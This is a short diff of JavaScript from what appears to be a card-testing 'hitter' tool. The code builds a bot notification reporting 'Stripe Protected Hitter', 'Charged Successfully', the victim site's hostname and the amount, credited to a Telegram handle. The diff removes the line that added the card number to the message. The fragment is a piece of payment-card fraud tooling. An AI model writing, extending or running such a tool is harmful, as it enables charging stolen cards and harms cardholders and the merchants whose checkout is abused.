@@ -74,7 +74,6 @@
                             `↔️ <b>Gateway:</b> <code>Stripe Protected Hitter</code>\n` +
                             `✅ <b>Response:</b> <code>Charged Successfully</code>\n` +
                             `🌐 <b>Site:</b> <code>${window.location.hostname || 'Unknown'}</code>\n` +
-                            `💳 <b>Card:</b> <code>${cardStr}</code>\n` +
                             `💰 <b>Amount:</b> <code>${amountStr}</code>\n\n` +
                             `<i>Checked by @hitinfobdrobot ✅</i>`;
 
